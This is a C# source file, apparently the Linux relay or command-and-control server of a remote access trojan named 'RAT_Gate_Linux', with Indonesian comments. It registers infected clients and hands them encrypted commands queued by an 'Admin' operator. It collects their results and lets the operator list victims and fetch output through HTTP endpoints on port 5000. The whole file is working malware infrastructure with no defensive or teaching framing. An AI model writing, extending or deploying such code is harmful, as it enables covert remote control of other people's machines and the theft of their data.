﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RAT_Gate_Linux
{
    public class ClientSession
    {
        public string ID { get; set; }
        public DateTime LastSeen { get; set; }
        public string PendingCommandEncrypted { get; set; } = "IDLE";
        public bool IsCommandReady { get; set; } = false;
        public string LastResultEncrypted { get; set; } = "";
        public bool ResultReceived { get; set; } = false;
    }

    internal class Program
    {
        private static Dictionary<string, ClientSession> clients = new Dictionary<string, ClientSession>();
        private static object lockObj = new object();

        static void Main(string[] args)
        {
            Console.WriteLine("=== RAT LINUX SERVER (BRIDGE / RELAY) ===");
            HttpListener listener = new HttpListener();

            try
            {
                listener.Prefixes.Add("http://*:5000/");
                listener.Start();
                Console.WriteLine("[+] Listener berjalan di port 5000 (Menunggu Klien dan Admin)...");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Gagal menjalankan server. Error: {ex.Message}");
                return;
            }

            Task.Run(() => HandleIncomingRequests(listener));

            while (true)
            {
                CheckDisconnectedClients();
                Thread.Sleep(5000);
            }
        }

        private static void CheckDisconnectedClients()
        {
            lock (lockObj)
            {
                var keys = clients.Keys.ToList();
                foreach (var key in keys)
                {
                    if ((DateTime.Now - clients[key].LastSeen).TotalSeconds > 15)
                    {
                        Console.WriteLine($"[-] Klien Terputus: {key}");
                        clients.Remove(key);
                    }
                }
            }
        }

        private static async Task HandleIncomingRequests(HttpListener listener)
        {
            while (listener.IsListening)
            {
                try
                {
                    var context = await listener.GetContextAsync();
                    var request = context.Request;
                    var response = context.Response;

                    string clientId = request.Headers["X-Client-ID"];
                    if (string.IsNullOrEmpty(clientId)) clientId = "Unknown";

                    if (clientId != "Admin" && clientId != "Unknown")
                    {
                        lock (lockObj)
                        {
                            if (!clients.ContainsKey(clientId))
                            {
                                Console.WriteLine($"[+] Klien Baru Terdaftar: {clientId}");
                                clients[clientId] = new ClientSession { ID = clientId };
                            }
                            clients[clientId].LastSeen = DateTime.Now;
                        }
                    }

                    // --- ROUTING KLIEN TARGET ---
                    if (request.Url.AbsolutePath == "/command" && request.HttpMethod == "GET")
                    {
                        string responseString = "IDLE";
                        lock (lockObj)
                        {
                            if (clients.ContainsKey(clientId) && clients[clientId].IsCommandReady)
                            {
                                responseString = clients[clientId].PendingCommandEncrypted;
                                clients[clientId].IsCommandReady = false;
                                clients[clientId].PendingCommandEncrypted = "IDLE";
                                Console.WriteLine($"[->] Mengirim perintah terenkripsi ke {clientId}");
                            }
                        }
                        byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }
                    else if (request.Url.AbsolutePath == "/result" && request.HttpMethod == "POST")
                    {
                        string resultText;
                        // PERBAIKAN: Menambahkan ?? Encoding.UTF8 untuk mencegah ArgumentNullException
                        using (var reader = new StreamReader(request.InputStream, request.ContentEncoding ?? Encoding.UTF8))
                        {
                            resultText = await reader.ReadToEndAsync();
                        }
                        lock (lockObj)
                        {
                            if (clients.ContainsKey(clientId))
                            {
                                clients[clientId].LastResultEncrypted = resultText;
                                clients[clientId].ResultReceived = true;
                                Console.WriteLine($"[<-] Hasil diterima dari {clientId}");
                            }
                        }
                        byte[] buffer = Encoding.UTF8.GetBytes("OK");
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }

                    // --- ROUTING ADMIN / SERVER CONTROLLER ---
                    else if (request.Url.AbsolutePath == "/admin/ping" && request.HttpMethod == "GET")
                    {
                        byte[] buffer = Encoding.UTF8.GetBytes("PONG");
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }
                    else if (request.Url.AbsolutePath == "/admin/clients" && request.HttpMethod == "GET")
                    {
                        string list = "";
                        lock (lockObj) { list = string.Join(",", clients.Keys); }
                        byte[] buffer = Encoding.UTF8.GetBytes(list);
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }
                    else if (request.Url.AbsolutePath == "/admin/command" && request.HttpMethod == "POST")
                    {
                        string targetId = request.Headers["X-Target-ID"];
                        string cmdEncrypted;
                        using (var reader = new StreamReader(request.InputStream, request.ContentEncoding ?? Encoding.UTF8))
                        {
                            cmdEncrypted = await reader.ReadToEndAsync();
                        }

                        lock (lockObj)
                        {
                            if (clients.ContainsKey(targetId))
                            {
                                clients[targetId].PendingCommandEncrypted = cmdEncrypted;
                                clients[targetId].IsCommandReady = true;
                                clients[targetId].ResultReceived = false;
                                Console.WriteLine($"[*] Admin memerintahkan Klien: {targetId}");
                            }
                            else
                            {
                                Console.WriteLine($"[!] Admin mengirim ke ID Klien yang tidak terdaftar: {targetId}");
                            }
                        }
                        byte[] buffer = Encoding.UTF8.GetBytes("OK");
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }
                    else if (request.Url.AbsolutePath == "/admin/result" && request.HttpMethod == "GET")
                    {
                        string targetId = request.Headers["X-Target-ID"];
                        string res = "";
                        lock (lockObj)
                        {
                            if (clients.ContainsKey(targetId) && clients[targetId].ResultReceived)
                            {
                                res = clients[targetId].LastResultEncrypted;
                                clients[targetId].ResultReceived = false;
                            }
                        }
                        byte[] buffer = Encoding.UTF8.GetBytes(res);
                        response.ContentLength64 = buffer.Length;
                        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                    }
                    else
                    {
                        response.StatusCode = 404;
                    }

                    response.Close();
                }
                catch { /* Abaikan request error */ }
            }
        }
    }
}